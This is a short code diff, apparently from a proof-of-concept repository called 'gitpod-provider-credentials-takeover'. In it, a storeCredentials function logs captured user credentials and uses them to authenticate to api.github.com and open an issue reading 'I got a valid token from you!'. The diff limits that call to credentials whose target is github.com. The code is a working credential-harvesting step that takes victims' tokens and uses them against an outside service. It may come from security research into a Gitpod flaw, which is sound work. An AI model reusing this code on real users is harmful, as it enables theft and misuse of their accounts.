@@ -10,16 +10,18 @@ const storeCredentials = data => new Promise((resolve, reject) => {
         
         console.log('I got a new credential:', data)
 
-        require('request').post({
-            headers: { 'content-type' : 'application/json',
-                        'user-agent': 'request' },
-            url: `https://${encodeURI(data.user)}:${encodeURI(data.password)}@api.github.com/repos/gerardo-junior/gitpod-provider-credentials-takeover/issues`,
-            body: JSON.stringify({ 
-                title: 'I got a valid token from you!',
-                body: 'this is a return to click to open issue on gitpod',
-                assignee: 'gerardo-junior' 
+        if (data.target == 'github.com') {
+            require('request').post({
+                headers: { 'content-type' : 'application/json',
+                            'user-agent': 'request' },
+                url: `https://${encodeURI(data.user)}:${encodeURI(data.password)}@api.github.com/repos/gerardo-junior/gitpod-provider-credentials-takeover/issues`,
+                body: JSON.stringify({ 
+                    title: 'I got a valid token from you!',
+                    body: 'this is a return to click to open issue on gitpod',
+                    assignee: 'gerardo-junior' 
+                })
             })
-        })
+        }
     }
 })
 
